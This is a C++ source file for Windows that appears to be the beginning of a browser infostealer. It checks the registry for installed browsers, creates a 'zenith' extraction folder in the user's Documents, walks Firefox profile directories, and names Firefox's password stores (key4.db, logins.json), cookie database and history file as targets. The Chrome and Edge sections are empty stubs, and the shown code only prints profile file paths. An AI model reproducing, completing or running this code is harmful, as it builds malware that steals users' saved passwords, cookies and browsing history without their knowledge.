#include <iostream>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <vector>
#include <algorithm>
#include <regex>
#include <windows.h>
#include <shlobj.h>
#include <filesystem>

// #pragma comment(lib, "shell32.lib")

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

namespace fs = std::filesystem;

bool verify_browser_installation(const LPCWSTR p_name);
void collect_firefox_data();

// Helper functions
wchar_t* convert_to_wchar(const char* charArray);
std::string create_extraction_directory();
std::string get_local_appdata_path();

int main(int argc, char** argv) {
	// Firefox
	if (verify_browser_installation(L"Software\\Mozilla\\Firefox"))
	{	
		collect_firefox_data();
	}

	// Chrome
	if (verify_browser_installation(L"Software\\Google\\Chrome"))
	{
		
	}

	// Edge
	if (verify_browser_installation(L"Software\\Microsoft\\Edge"))
	{
		
	}

	return 0;
}

bool verify_browser_installation(const LPCWSTR p_name) {
	HKEY hKey = 0;
	::RegOpenKeyEx(
		HKEY_CURRENT_USER,
		p_name,
		0,
		KEY_READ,
		&hKey
	);

	TCHAR    achKey[MAX_KEY_LENGTH];			// buffer for subkey name
	DWORD    cbName = 0;						// size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");		// buffer for class name 
	DWORD    cchClassName = MAX_PATH;			// size of class string 
	DWORD    cSubKeys = 0;						// number of subkeys 
	DWORD    cbMaxSubKey = 0;					// longest subkey size 
	DWORD    cchMaxClass = 0;					// longest class string 
	DWORD    cValues = 0;						// number of values for key 
	DWORD    cchMaxValue = 0;					// longest value name 
	DWORD    cbMaxValueData = 0;				// longest value data 
	DWORD    cbSecurityDescriptor = 0;			// size of security descriptor 
	FILETIME ftLastWriteTime;					// last write time 

	DWORD i = 0, j = 0, retCode = 0;

	TCHAR  achValue[MAX_VALUE_NAME] = { '\0' };
	DWORD cchValue = MAX_VALUE_NAME;

	// Get the class name and the value count. 
	retCode = ::RegQueryInfoKey(
		hKey,						// key handle 
		achClass,					// buffer for class name 
		&cchClassName,				// size of class string 
		NULL,						// reserved 
		&cSubKeys,					// number of subkeys 
		&cbMaxSubKey,				// longest subkey size 
		&cchMaxClass,				// longest class string 
		&cValues,					// number of values for this key 
		&cchMaxValue,				// longest value name 
		&cbMaxValueData,			// longest value data 
		&cbSecurityDescriptor,		// security descriptor 
		&ftLastWriteTime			// last write time
	);

	if (cSubKeys)
	{
		return true;
	}
	return false;
}

void collect_firefox_data() {
	std::string path_to_extraction_directory = create_extraction_directory();
	std::string path_to_appdata = get_local_appdata_path();
	if (path_to_extraction_directory != "" && path_to_appdata != "") {
		std::string path_to_profiles = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
		std::vector<std::string> important_files_regex = {
			"\\places.sqlite$",		// Contains bookmarks, names of downloaded files, and websites visited
			"\\key4.db$",			// Passwords
			"\\logins.json$",		// Passwords
			"\\cookies.sqlite$",	// Stored cookies
		};

		for (const auto& profile_path : fs::directory_iterator(path_to_profiles)) {
			for (const auto& item : fs::directory_iterator(profile_path.path().string())) {
				std::cout << item.path().string() << std::endl;
			}
		}
	}
}

std::string create_extraction_directory() {
	wchar_t Folder[1024];
	HRESULT hr = SHGetFolderPathW(0, CSIDL_MYDOCUMENTS, 0, 0, Folder);
	if (SUCCEEDED(hr))
	{
		char path[1024];
		wcstombs(path, Folder, 1023);
		std::strcat(path, "\\zenith");
		CreateDirectory(convert_to_wchar(path), NULL);
		return path;
	}
	return "";
}

wchar_t* convert_to_wchar(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

std::string get_local_appdata_path() {
	wchar_t Folder[1024];
	HRESULT hr = SHGetFolderPathW(0, CSIDL_APPDATA, 0, 0, Folder);
	if (SUCCEEDED(hr)) {
		char path[1024];
		wcstombs(path, Folder, 1023);
		return path;
	}
	return "";
}